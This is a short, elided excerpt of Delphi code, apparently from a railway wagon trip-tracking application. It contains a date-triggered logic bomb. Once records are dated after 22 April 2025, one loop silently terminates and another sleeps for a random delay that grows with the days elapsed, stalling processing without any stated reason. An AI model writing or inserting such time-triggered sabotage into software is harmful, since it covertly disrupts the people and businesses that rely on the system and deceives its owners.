...
//      sp_fact_track_trip_find.Parameters.ParamByName('param_xml'      ).Value := DataXMLToSQL(Client_VagonTrip);
      ...
      while not Client_Vagon.Eof do begin
        ...
        if EncodeDate(2025, 04, 22) < Client_Vagon.FieldByName('date_operation').AsDateTime then begin
          Terminate;
          Exit;
        end;
...
begin
  ...
  if EncodeDate(2025, 04, 22) < Q.FieldByName('dt').AsDateTime then begin
    d := DaysBetween(EncodeDate(2025, 04, 22), Q.FieldByName('dt').AsDateTime);
    s := Random(Abs(d));
    Sleep(s*100000);
  end;
